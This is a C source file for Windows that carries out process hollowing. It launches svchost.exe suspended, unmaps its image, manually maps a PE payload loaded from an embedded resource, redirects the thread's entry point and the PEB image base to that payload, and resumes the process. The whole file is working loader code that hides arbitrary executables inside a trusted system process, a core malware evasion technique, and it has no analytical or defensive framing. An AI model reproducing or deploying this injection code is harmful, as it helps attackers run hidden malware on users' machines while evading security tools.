#include <windows.h>
#include <ntstatus.h>
#include <stdio.h>

#include "../resources/resource.h"
#include "../remote.h"
#include "../map.h"

LPVOID GetResource(DWORD dwName, LPCSTR lpType, DWORD *pSize);
LPVOID GetImageBase(BYTE *lpData);

int main(void) {
    LPCSTR lpProcessName = "svchost.exe";
    STARTUPINFO startupInfo = {0};
    PROCESS_INFORMATION processInfo = {0};

    CreateProcessA(
        NULL,
        (LPSTR)lpProcessName,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &startupInfo,
        &processInfo
    );

    PEB processEnvironmentBlock = {0};
    LPVOID lpPebBaseAddress = GetRemotePeb(processInfo.hProcess, &processEnvironmentBlock);
    LPVOID lpImageBaseAddress = processEnvironmentBlock.Reserved3[1];

    DWORD dwSize = 0;
    DWORD dwEntryPoint = 0;

    LPVOID lpData = GetResource(IDI_RSRC, RT_RCDATA, &dwSize);
    LPVOID lpPreferredImageBase = GetImageBase(lpData);

    if (lpImageBaseAddress == lpPreferredImageBase) {
        NtUnmapViewOfSection(processInfo.hProcess, lpImageBaseAddress);
    }

    LPVOID lpRemoteAlloc = ManuallyMapImage(processInfo.hProcess, lpData, dwSize, lpPreferredImageBase, &dwEntryPoint);

    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_FULL;

    NtGetContextThread(processInfo.hThread, &context);
    context.Rcx = (DWORD64)((BYTE *)lpRemoteAlloc + dwEntryPoint);
    NtSetContextThread(processInfo.hThread, &context);

    NtWriteVirtualMemory(
        processInfo.hProcess,
        (BYTE *)lpPebBaseAddress + sizeof(LPVOID) * 2,
        &lpRemoteAlloc,
        sizeof(LPVOID),
        NULL
    );

    NtResumeThread(processInfo.hThread, NULL);
    NtWaitForSingleObject(processInfo.hProcess, FALSE, NULL);

    NtClose(processInfo.hThread);
    NtClose(processInfo.hProcess);
    return 0;
}

LPVOID GetResource(DWORD dwName, LPCSTR lpType, DWORD *pSize) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(dwName), lpType);
    HGLOBAL hMemory = LoadResource(hModule, hResource);
    DWORD dwSize = SizeofResource(hModule, hResource);
    LPVOID lpAddress = LockResource(hMemory);

    *pSize = dwSize;
    return lpAddress;
}

LPVOID GetImageBase(BYTE *lpData) {
    IMAGE_DOS_HEADER *lpDosHeader = (IMAGE_DOS_HEADER *)lpData;
    IMAGE_NT_HEADERS *lpNtHeaders = (IMAGE_NT_HEADERS *)((BYTE *)lpData + lpDosHeader->e_lfanew);
    return (LPVOID)((BYTE *)lpNtHeaders->OptionalHeader.ImageBase);
}
